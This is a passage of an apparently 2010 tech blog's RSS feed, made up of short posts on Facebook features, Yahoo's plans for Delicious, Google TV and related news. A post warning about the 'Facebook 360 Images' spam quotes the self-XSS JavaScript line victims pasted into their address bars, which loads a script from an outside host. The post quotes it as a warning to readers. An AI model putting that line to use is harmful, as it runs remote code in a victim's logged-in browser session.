&lt;a href=&#34;http://www.chitchat.org.uk/english/home/&#34;&gt;Download&lt;/a&gt; Chit Chat Instant Chat Messenger.&lt;/p&gt;</description>
    </item>
    <item>
      <title>How To Get ‘THAT’ Creative Facebook Profile</title>
      <link>https://example.org/posts/2010-12-18-how-to-get-that-creative-facebook-profile/</link>
      <pubDate>Sat, 18 Dec 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-12-18-how-to-get-that-creative-facebook-profile/</guid>
      <description>&lt;p&gt;Love my new creative Facebook &lt;a href=&#34;http://www.facebook.com/k.avinash&#34;&gt;Profile&lt;/a&gt; Page? I managed to maximize the new &lt;a href=&#34;http://www.cosmogeek.info/2010/12/how-to-get-new-facebook-profile.html&#34;&gt;Facebook design&lt;/a&gt; released officially last week in a rather innovative and original way!&lt;/p&gt;
&lt;p&gt;[&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;images/profile-pic.jpg&#34;&gt;- Create a new photo album, then upload the other images in the order of their filenames.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Tag yourself in all 5 photos, starting with &amp;ldquo;image5.jpg&amp;rdquo; and ending with &amp;ldquo;image1.jpg.&amp;rdquo;&lt;/li&gt;
&lt;li&gt;Hide any tagged photos you do not wish to display on your profile. That&amp;rsquo;s it!
Try out combinations and post your innovative profile page links in the comments section below or on](&lt;a href=&#34;http://lh4.ggpht.com/_40bmzDo_mBs/TQxymGmXDvI/AAAAAAAABrU/JyKOV849Hss/s1600-h/image%5B3%5D.png&#34;&gt;http://lh4.ggpht.com/_40bmzDo_mBs/TQxymGmXDvI/AAAAAAAABrU/JyKOV849Hss/s1600-h/image%5B3%5D.png&lt;/a&gt;) &lt;a href=&#34;http://www.facebook.com/cosmoGeek&#34;&gt;Facebook&lt;/a&gt; fan page or on &lt;a href=&#34;http://twitter.com/k_avinash&#34;&gt;Twitter&lt;/a&gt;. Share this post using social network buttons at the beginning of the post and let your friends change their Facebook profile pages using innovative ideas.&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>Delicious Will Stay Live!</title>
      <link>https://example.org/posts/2010-12-17-delicious-will-stay-live/</link>
      <pubDate>Fri, 17 Dec 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-12-17-delicious-will-stay-live/</guid>
      <description>&lt;p&gt;In an exclusive blog post today, Delicious says – “&lt;strong&gt;No, we are not shutting down Delicious&lt;/strong&gt;”.&lt;/p&gt;
&lt;p&gt;Yesterday, it wall all &lt;a href=&#34;http://www.cosmogeek.info/2010/12/yahoo-is-shutting-down-delicious.html&#34;&gt;confirmed&lt;/a&gt; that Yahoo was shutting down Delicious, one of the most popular bookmarking services.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh3.ggpht.com/_40bmzDo_mBs/TQu3IqzJj8I/AAAAAAAABrM/1v765g8bJJM/s1600-h/image%5B3%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;images/image%5B4%5D.png&#34; title=&#34;image&#34;&gt;leaked&lt;/a&gt; roadmap,&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;“Part of our organizational streamlining involves cutting our investment in underperforming or off-strategy products to put better focus on our core strengths and fund new innovation in the next year and beyond.&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;We continuously evaluate and prioritize our portfolio of products and services, and do plan to shut down some products in the coming months such as Yahoo! Buzz, our Traffic APIs, and others. We will communicate specific plans when appropriate.”&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Yahoo Is Shutting Down Del.icio.us. [Confirmed]</title>
      <link>https://example.org/posts/2010-12-17-yahoo-is-shutting-down-del-icio-us-confirmed/</link>
      <pubDate>Fri, 17 Dec 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-12-17-yahoo-is-shutting-down-del-icio-us-confirmed/</guid>
      <description>&lt;p&gt;A screenshot leaked few hours ago on Twitter shows an interesting and breaking changes that Yahoo is planning to do in near future.&lt;/p&gt;
&lt;p&gt;According to the screenshot &lt;a href=&#34;http://twitter.com/#!/bpm140/status/15473591558602752&#34;&gt;posted&lt;/a&gt; by MyBlogLog founder Eric Marcoullier on Twitter, Yahoo! is either closing or merging the social bookmarking service ‘&lt;strong&gt;Delicious’&lt;/strong&gt; as well as Upcoming, Fire Eagle, MyBlogLog and others.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh5.ggpht.com/_40bmzDo_mBs/TQsGp562q_I/AAAAAAAABno/Slt0EgOr-6g/s1600-h/image%5B4%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh6.ggpht.com/_40bmzDo_mBs/TQsGrIaKowI/AAAAAAAABns/FwtBgJwLh5U/image_thumb%5B2%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Listed under the ominous “Sunset” are: Delicious, Altavista, MyBlogLog, Yahoo! Bookmarks, Yahoo! Picks.&lt;/p&gt;
&lt;p&gt;Under “Merge” are: Upcoming, FoxyTunes, Sideline, FireEagle, Yahoo Events and Yahoo People Search.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Facebook Brings Face Recognition to Photo Tagging</title>
      <link>https://example.org/posts/2010-12-16-facebook-brings-face-recognition-to-photo-tagging/</link>
      <pubDate>Thu, 16 Dec 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-12-16-facebook-brings-face-recognition-to-photo-tagging/</guid>
      <description>&lt;p&gt;Today, the social network giant Facebook boosted the usability of its photo sharing and tagging product to enabling &lt;strong&gt;&lt;em&gt;auto tagging&lt;/em&gt;&lt;/strong&gt; of photos. Wonder how? It uses its &lt;em&gt;&lt;strong&gt;face recognition&lt;/strong&gt;&lt;/em&gt; feature to detect a person and then utilize your network of friends as reference to place tags on the people visible in the picture.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh4.ggpht.com/_40bmzDo_mBs/TQoG2c4M0PI/AAAAAAAABng/126U7ZDrj14/s1600-h/image%5B3%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh4.ggpht.com/_40bmzDo_mBs/TQoG3AfhaLI/AAAAAAAABnk/6Y1Bl0Ngcg4/image_thumb%5B1%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;A &amp;ldquo;tag suggestion&amp;rdquo; feature crafted to identify people in uploaded pictures should be rolled out to all US users in the next few weeks. Now if you upload pictures from your cousin&amp;rsquo;s wedding, Facebook will group together pictures of the bride and suggest her name!&lt;/p&gt;</description>
    </item>
    <item>
      <title>Mark Zuckerberg’s Album [Pictures]</title>
      <link>https://example.org/posts/2010-12-15-mark-zuckerbergs-album-pictures/</link>
      <pubDate>Wed, 15 Dec 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-12-15-mark-zuckerbergs-album-pictures/</guid>
      <description>&lt;p&gt;Facebook founder Mark Zuckerberg has become the second youngest person ever to win &lt;strong&gt;TIME&lt;/strong&gt; Magazine’s &lt;strong&gt;Person Of The Year 2010&lt;/strong&gt;. TIME Magazine chose Zuckerberg for helping to connect “more than half a billion people and mapping the social relations among them.”&lt;/p&gt;
&lt;p&gt;Below are some of the pictures from TIME’s exclusive Zuckerberg Family Album -&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Baby Days -&lt;/strong&gt; Born in 1984, Facebook founder Mark Zuckerberg grew up in Dobb&amp;rsquo;s Ferry, New York, the son of a dentist and a psychiatrist.&lt;/p&gt;</description>
    </item>
    <item>
      <title>How To Get The New Facebook Profile</title>
      <link>https://example.org/posts/2010-12-06-how-to-get-the-new-facebook-profile/</link>
      <pubDate>Mon, 06 Dec 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-12-06-how-to-get-the-new-facebook-profile/</guid>
      <description>&lt;p&gt;Today, Facebook introduced all new profile design in which it claims it will be much easier for you to tell your story and learn about your friends! This will roll out gradually to all users in over next few days.&lt;/p&gt;
&lt;p&gt;If you aren’t able to wait that long, you can get the new profile by visiting &lt;a href=&#34;http://www.facebook.com/about/profile&#34;&gt;http://www.facebook.com/about/profile&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh5.ggpht.com/_40bmzDo_mBs/TPyT1EDEAdI/AAAAAAAABlQ/XmqrzAFfbd8/s1600-h/image%5B3%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh6.ggpht.com/_40bmzDo_mBs/TPyT2WZshHI/AAAAAAAABlY/s3KCyw_gYKo/image_thumb%5B1%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;So, what&amp;rsquo;s new with this new design -&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;A New Introduction&lt;/strong&gt; – It begins with basic info such as where you’re from, where you went to school, and where you work - ﻿the kinds of conversation starters you share with people you&amp;rsquo;ve just met&lt;/p&gt;</description>
    </item>
    <item>
      <title>How To Get Rid of “Facebook 360 Images” Spam</title>
      <link>https://example.org/posts/2010-12-04-how-to-get-rid-of-facebook-360-images-spam/</link>
      <pubDate>Sat, 04 Dec 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-12-04-how-to-get-rid-of-facebook-360-images-spam/</guid>
      <description>&lt;p&gt;Another one sleazy spam is now underway on Facebook and it involves showing people &lt;strong&gt;Face-book images rotate 360*&lt;/strong&gt;. Similar one is pretending to show &lt;strong&gt;Really cool Facebook revolving images.&lt;/strong&gt; &lt;strong&gt;&lt;a href=&#34;http://www.cosmogeek.info/&#34;&gt;cosmoGeek&lt;/a&gt;&lt;/strong&gt; instantly alerted its members about these kind of spams in past few days via Facebook fan &lt;a href=&#34;http://www.facebook.com/cosmoGeek&#34;&gt;page&lt;/a&gt; and &lt;a href=&#34;http://twitter.com/k_avinash&#34;&gt;Twitter&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh6.ggpht.com/_40bmzDo_mBs/TPqa4xVQXSI/AAAAAAAABk4/K6_VQhseyl4/s1600-h/image%5B38%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;images/Capture%5B11%5D.jpg&#34; title=&#34;image&#34;&gt;&lt;img alt=&#34;Capture&#34; loading=&#34;lazy&#34; src=&#34;http://lh6.ggpht.com/_40bmzDo_mBs/TPqa9FPz4aI/AAAAAAAABlE/XLdIXrpYeb4/Capture_thumb%5B9%5D.jpg?imgmax=800&#34; title=&#34;Capture&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;All these users unfortunately and unknowingly copy pasted the following script into their browser address bars hoping to see revolving images.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;JavaScript:(a = (b =  document).createElement(&amp;amp;quot;script&amp;amp;quot;)).src =   &amp;amp;quot;//graphicgiants.com/majic.js?show&amp;amp;quot;, b.body.appendChild(a); void(0)&lt;/p&gt;</description>
    </item>
    <item>
      <title>Facebook co-founder launches Jumo–“A Social Network for Change”</title>
      <link>https://example.org/posts/2010-11-30-facebook-co-founder-launches-jumo-a-social-network-for-change/</link>
      <pubDate>Tue, 30 Nov 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-11-30-facebook-co-founder-launches-jumo-a-social-network-for-change/</guid>
      <description>&lt;p&gt;Facebook co-founder &lt;strong&gt;Chris Hughes&lt;/strong&gt; today announced the public beta launch of &lt;strong&gt;“Jumo”,&lt;/strong&gt; a social network for people who want to change the world.&lt;/p&gt;
&lt;p&gt;Chris co-founded Facebook in 2004 and helped lay the foundation for the communications and product management teams.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh6.ggpht.com/_40bmzDo_mBs/TPUOiQxnl_I/AAAAAAAABkg/hMnPnmE3pfo/s1600-h/image%5B3%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh6.ggpht.com/_40bmzDo_mBs/TPUOjYbPhJI/AAAAAAAABkk/5WWtO0S89dU/image_thumb%5B1%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;http://www.jumo.com/&#34;&gt;Jumo&lt;/a&gt;&lt;/strong&gt; launches today, November 30th, supporting 3,500 charities in over 200 issue areas across the world. The site enables you to search for issues and organizations that spark your compassion, whether it’s a girls’ school in rural Kenya or a homeless shelter in Haiti; follow the latest news and updates; and support their work by donating your time, money or skills.&lt;/p&gt;</description>
    </item>
    <item>
      <title>“Facebook Messaging” - The Next Generation Email System and Email Killer</title>
      <link>https://example.org/posts/2010-11-15-facebook-messaging-the-next-generation-email-system-and-email-killer/</link>
      <pubDate>Mon, 15 Nov 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-11-15-facebook-messaging-the-next-generation-email-system-and-email-killer/</guid>
      <description>&lt;p&gt;This is not an “&lt;strong&gt;Email Killer&lt;/strong&gt;” – Mark Zuckerberg emphasized at the Massive Messaging Facebook event, which is happening now. Today, Facebook announced the next evolution of messaging system.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh4.ggpht.com/_40bmzDo_mBs/TOGFkhfse8I/AAAAAAAABhg/NhAb1bqKnM8/s1600-h/image%5B9%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;images/image%5B10%5D.png&#34; title=&#34;image&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;images/image%5B16%5D.png&#34; title=&#34;image&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh3.ggpht.com/_40bmzDo_mBs/TOGFu0rWxqI/AAAAAAAABh0/P28pEWksJOE/image_thumb%5B10%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Facebook is going to launch this revolutionary messaging and email addresses gradually in next few months. Once you receive an invitation, you&amp;rsquo;ll be able to get started and also invite your friends to join you.&lt;/p&gt;
&lt;p&gt;So, do you think this is a &lt;strong&gt;“Gmail Killer”&lt;/strong&gt;?&lt;/p&gt;</description>
    </item>
    <item>
      <title>Facebook launching Web Email Client?</title>
      <link>https://example.org/posts/2010-11-12-facebook-launching-web-email-client/</link>
      <pubDate>Fri, 12 Nov 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-11-12-facebook-launching-web-email-client/</guid>
      <description>&lt;p&gt;Is Facebook launching a web-based Email Client? According to TechCrunch, Facebook may introduce it on its Monday’s special event.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh5.ggpht.com/_40bmzDo_mBs/TN08ke0migI/AAAAAAAABhA/vrKof2lFL-I/s1600-h/image%5B3%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh4.ggpht.com/_40bmzDo_mBs/TN08lVsZXgI/AAAAAAAABhE/-zg5csbMHiA/image_thumb%5B1%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This full featured webmail product is a secret project from Facebook known as &lt;strong&gt;Titan.&lt;/strong&gt; This is unofficially and over-enthusiastically known as &lt;strong&gt;Gmail Killer.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;It could just a UI refresh for Facebook’s existing messaging service with POP access tacked on.&lt;/p&gt;
&lt;p&gt;Hang on for more updates and do not miss your desired personal &lt;strong&gt;@facebook.com&lt;/strong&gt; username if this biggy is true.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Facebook “Unlike” Button comes to Pages Feed</title>
      <link>https://example.org/posts/2010-11-03-facebook-unlike-button-comes-to-pages-feed/</link>
      <pubDate>Wed, 03 Nov 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-11-03-facebook-unlike-button-comes-to-pages-feed/</guid>
      <description>&lt;p&gt;This is not the “Unlike” button you are waiting for status updates! Rather, Facebook added an “Unlike Page” button for Pages feed.It has made dramatically easier to Unlike Pages and Open Graph objects.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh6.ggpht.com/_40bmzDo_mBs/TNG1hHt8KVI/AAAAAAAABgI/SHZddGRtZBc/s1600-h/image%5B4%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh4.ggpht.com/_40bmzDo_mBs/TNG1iClyjWI/AAAAAAAABgM/axNwuStztTI/image_thumb%5B2%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Clicking on the small “X” button next to any update from a Facebook Page will list the regular options, “&lt;em&gt;Hide this post&lt;/em&gt;,” “&lt;em&gt;Hide all by [page]&lt;/em&gt;,” “&lt;em&gt;Hide all by [app]&lt;/em&gt;” and “&lt;em&gt;Mark as spam&lt;/em&gt;,” but also a new “&lt;em&gt;Unlike Page&lt;/em&gt;” option.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Search Facebook in Real-Time using ‘FbInstant’</title>
      <link>https://example.org/posts/2010-10-31-search-facebook-in-real-time-using-fbinstant/</link>
      <pubDate>Sun, 31 Oct 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-10-31-search-facebook-in-real-time-using-fbinstant/</guid>
      <description>&lt;p&gt;We already know how Google changed the search experience using &lt;a href=&#34;http://www.google.com/instant/&#34;&gt;Google Instant&lt;/a&gt; where you type keywords on your search and you get the results displayed while you type.&lt;/p&gt;
&lt;p&gt;Close on the heels of Google Instant, many third party developers came with &lt;a href=&#34;http://www.cosmogeek.info/2010/09/after-google-instant-its-youtube.html&#34;&gt;YouTube Instant&lt;/a&gt;,&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://www.cosmogeek.info/2010/09/after-google-instant-its-youtube.html&#34;&gt;Twitter Instant&lt;/a&gt; etc..&lt;/p&gt;
&lt;p&gt;Now, lets see &lt;a href=&#34;http://www.fbinstant.net/&#34;&gt;Facebook Instant&lt;/a&gt; -&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh6.ggpht.com/_40bmzDo_mBs/TM2j0JCkx3I/AAAAAAAABf4/WuJTomutrhc/s1600-h/image%5B4%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh3.ggpht.com/_40bmzDo_mBs/TM2j2x_u_-I/AAAAAAAABf8/ZJQrUNVnE_o/image_thumb%5B2%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Fbinstant is a real-time search engine that allows you to browse public and media content of Facebook instantly without breaking the privacy settings of Facebook users.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Farmville and Foursquare Among 50 Worst Inventions</title>
      <link>https://example.org/posts/2010-10-30-farmville-and-foursquare-among-50-worst-inventions/</link>
      <pubDate>Sat, 30 Oct 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-10-30-farmville-and-foursquare-among-50-worst-inventions/</guid>
      <description>&lt;p&gt;According to TIME’s list, &lt;strong&gt;Farmville&lt;/strong&gt; and &lt;strong&gt;Foursquare&lt;/strong&gt; are among the world’s 50 worst inventions.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://en.wikipedia.org/wiki/File:FarmVille_logo.png&#34;&gt;&lt;img alt=&#34;FarmVille&#34; loading=&#34;lazy&#34; src=&#34;https://example.org/posts/2010-10-30-farmville-and-foursquare-among-50-worst-inventions/images/FarmVille_logo.png&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The list of “the world’s bright ideas that just didn’t work out” included both the location-based social game Foursquare and Zynga’s Farmville.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Farmville&lt;/strong&gt; is the most addictive of Facebook games is hardly even a game — it&amp;rsquo;s more a series of mindless chores on a digital farm, requiring the endless clicking of a mouse to plant and harvest crops. And yet Zynga, the evil genius behind this bizarre digital addiction, says more than 10% of Americans have logged in to create online homesteads.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Facebook Launches ‘Friendship Pages’</title>
      <link>https://example.org/posts/2010-10-29-facebook-launches-friendship-pages/</link>
      <pubDate>Fri, 29 Oct 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-10-29-facebook-launches-friendship-pages/</guid>
      <description>&lt;p&gt;Facebook is now allowing you to document all of your interactions on the network with particular friends on designated pages called ‘&lt;strong&gt;&lt;a href=&#34;http://blog.facebook.com/blog.php?post=443390892130&#34;&gt;Friendship Pages&lt;/a&gt;&lt;/strong&gt;,’ the pages contain all public Wall posts and comments between you and a designated friend, photos in which you are both are tagged, events you’ve RSVP’d to together and more.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh4.ggpht.com/_40bmzDo_mBs/TMsRhGygXeI/AAAAAAAABfM/Vk9EmN6Y3bY/s1600-h/image%5B3%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh6.ggpht.com/_40bmzDo_mBs/TMsRieSxjjI/AAAAAAAABfQ/ee6zvuQstKM/image_thumb%5B1%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;You’ll be able to see other’s friendship page if you are friends with one of the people and have permission to view both people’s profiles.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Wikipedia to open office in India</title>
      <link>https://example.org/posts/2010-10-29-wikipedia-to-open-office-in-india/</link>
      <pubDate>Fri, 29 Oct 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-10-29-wikipedia-to-open-office-in-india/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;http://commons.wikipedia.org/wiki/File:Wm2007_press_002.jpg&#34;&gt;&lt;img alt=&#34;Jimmy Wales (left) during Wikimania press conf&amp;hellip;&#34; loading=&#34;lazy&#34; src=&#34;https://example.org/posts/2010-10-29-wikipedia-to-open-office-in-india/images/300px-Wm2007_press_002.jpg&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Image via &lt;a href=&#34;http://commons.wikipedia.org/wiki/File:Wm2007_press_002.jpg&#34;&gt;Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The owner of the online encyclopaedia, &lt;strong&gt;Wikipedia&lt;/strong&gt;, plans to open an office in &lt;strong&gt;India&lt;/strong&gt;, first office outside the US, says Wikimedia Foundation co-founder, &lt;strong&gt;Jimmy Wales.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;He told the Indian website, CIOL, that no location had been chosen yet, but the office would open within several months.&lt;/p&gt;
&lt;p&gt;Europe and Africa had been considered as possible locations. But Europe was already highly developed and there were concerns about the technical capabilities in Africa, he said.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Say Bye-bye to Orkut</title>
      <link>https://example.org/posts/2010-10-23-say-bye-bye-to-orkut/</link>
      <pubDate>Sat, 23 Oct 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-10-23-say-bye-bye-to-orkut/</guid>
      <description>&lt;p&gt;Say cheerio to Orkut finally! You can now update your Orkut status directly from Facebook. Keep in touch and connect your friends on Orkut by updating them with your Facebook activity.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh6.ggpht.com/_40bmzDo_mBs/TMKgMKfPowI/AAAAAAAABe4/yrDVDu5cpV0/s1600-h/image%5B3%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh3.ggpht.com/_40bmzDo_mBs/TMKgN4CxnLI/AAAAAAAABe8/Nuzy-XvpXlE/image_thumb%5B1%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;You might have got a message today in your Facebook – if you haven’t – don’t worry, you can go &lt;a href=&#34;http://www.facebook.com/feed/export/orkut/&#34;&gt;here&lt;/a&gt; to link both the accounts.&lt;/p&gt;
&lt;p&gt;You can share status updates, links, photos, notes, events, and groups with your friends on Orkut directly from Facebook.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Bing “Likes” Facebook</title>
      <link>https://example.org/posts/2010-10-16-bing-likes-facebook/</link>
      <pubDate>Sat, 16 Oct 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-10-16-bing-likes-facebook/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;http://lh3.ggpht.com/_40bmzDo_mBs/TLlgCH8R4PI/AAAAAAAABdk/aXfKFBqKqiQ/s1600-h/image%5B4%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh6.ggpht.com/_40bmzDo_mBs/TLlgDv2Sc8I/AAAAAAAABdo/4U_7s8b3boc/image_thumb%5B2%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Microsoft has announced that Bing will partner with Facebook to deliver personalized search results based on your social network.&lt;/p&gt;
&lt;p&gt;Bing will enable a great search experience for people queries, by bringing in information from your Facebook friends and people who share networks with you, and will show you what your friends have liked as you navigate through search results in Bing.&lt;br&gt;
A new feature called &lt;em&gt;Liked Results&lt;/em&gt;, which uses Facebook “like” information to help you discover new information and get more personalized results in Bing. &lt;em&gt;Facebook Profile Search&lt;/em&gt; on Bing also lets you find old friends or discover new ones.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Facebook introduced new version of Groups and two more new features.</title>
      <link>https://example.org/posts/2010-10-07-facebook-introduced-new-version-of-groups-and-two-more-new-features/</link>
      <pubDate>Thu, 07 Oct 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-10-07-facebook-introduced-new-version-of-groups-and-two-more-new-features/</guid>
      <description>&lt;p&gt;Last night, I’ve covered live updates of Facebook event in cosmoGeek’s Facebook &lt;a href=&#34;http://www.facebook.com/cosmoGeek&#34;&gt;fan page&lt;/a&gt; and as well as on my &lt;a href=&#34;http://twitter.com/k_avinash&#34;&gt;Twitter&lt;/a&gt; account.&lt;/p&gt;
&lt;p&gt;To summarize, Facebook yesterday revealed 3 new features - a new version of Groups, an option to download &lt;em&gt;your&lt;/em&gt; &lt;em&gt;information&lt;/em&gt; locally, new dashboard for apps you use.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.   New Facebook Groups&lt;/strong&gt; Until now, Facebook has made it easy to share with all of your friends or with everyone, but there hasn&amp;rsquo;t been a simple way to create and maintain a space for sharing with the small communities of people in your life, like your roommates, classmates, co-workers and family&lt;/p&gt;</description>
    </item>
    <item>
      <title>Here comes Google TV with more apps</title>
      <link>https://example.org/posts/2010-10-04-here-comes-google-tv-with-more-apps/</link>
      <pubDate>Mon, 04 Oct 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-10-04-here-comes-google-tv-with-more-apps/</guid>
      <description>&lt;p&gt;Google introduced ‘Google TV’ almost five months ago to the world at Google I/O and today they have got all new updates to this amazing product.&lt;/p&gt;
&lt;p&gt;For those who haven’t yet heard of it, &lt;strong&gt;&lt;a href=&#34;http://www.google.com/tv/&#34;&gt;Google TV&lt;/a&gt;&lt;/strong&gt; is a new way to think about TV: it’s a platform that combines your current TV programming and the open web into a single, seamless entertainment experience.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh6.ggpht.com/_40bmzDo_mBs/TKojQPMHSCI/AAAAAAAABcA/lJ9IBgF1Yo0/s1600-h/image%5B5%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh5.ggpht.com/_40bmzDo_mBs/TKojR6zPBII/AAAAAAAABcE/mkzZMZnmLNI/image_thumb%5B3%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;It is the tech giant&amp;rsquo;s attempt to bring the full Internet to TV sets, via new TVs and Blu-ray players from &lt;strong&gt;Sony&lt;/strong&gt; and a set-top box from &lt;strong&gt;Logitech&lt;/strong&gt;. Google won&amp;rsquo;t say when exactly Google TV is launching, but it is expected in mid-October. Logitech is having a press conference Wednesday in San Francisco, where it&amp;rsquo;s expected to reveal its launch date, followed by a Sony press conference on October 12th.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Facebook Movie “The Social Network” Releasing Today (not in India)</title>
      <link>https://example.org/posts/2010-10-01-facebook-movie-the-social-network-releasing-today-not-in-india/</link>
      <pubDate>Fri, 01 Oct 2010 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2010-10-01-facebook-movie-the-social-network-releasing-today-not-in-india/</guid>
      <description>&lt;p&gt;&lt;strong&gt;The Social Network&lt;/strong&gt; is a movie about the founder of the most popular social network website ‘Facebook’ till date. This movie with tag line “You don’t get to 500 million friends without making a few enemies” is directed by David Fincher and written by Aaron Sorkin.&lt;/p&gt;
&lt;p&gt;It is officially releasing today in USA and Canada. The release date in India is on 10th December 2010.&lt;/p&gt;
